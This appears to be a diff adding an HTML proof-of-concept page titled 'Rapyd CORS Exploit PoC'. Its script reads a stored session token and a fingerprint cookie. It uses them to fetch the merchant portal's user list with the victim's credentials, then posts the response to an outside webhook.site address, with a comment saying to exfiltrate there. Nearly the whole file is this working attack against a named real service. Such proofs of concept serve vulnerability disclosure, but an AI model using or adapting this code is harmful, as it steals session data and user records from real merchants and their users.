@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <h2>💣 Rapyd CORS Exploit PoC</h2>
+    
+    <script>
+      
+      const headers = {
+        "Content-Type": "application/json",
+        "Token": localStorage.getItem('token'),
+        "Fingerprint": document.cookie.match(/Fingerprint=([^;]+)/)[1]
+      };
+
+      fetch("https://dashboard.rapyd.net/v1/merchants-portal/list/users", {
+        method: "GET",
+        credentials: "include",
+        headers: headers // Correctly pass headers here
+      })
+        .then(response => response.text())
+        .then(data => {
+          // Exfiltrate to your webhook
+          fetch("https://webhook.site/57d05575-394e-4d7f-b280-b805ce1da79e", {
+            method: "POST",
+            mode: "no-cors",
+            body: data
+          });
+        })
+        .catch(err => console.error("Exploit failed:", err));
+    </script>
+  </body>
+</html>
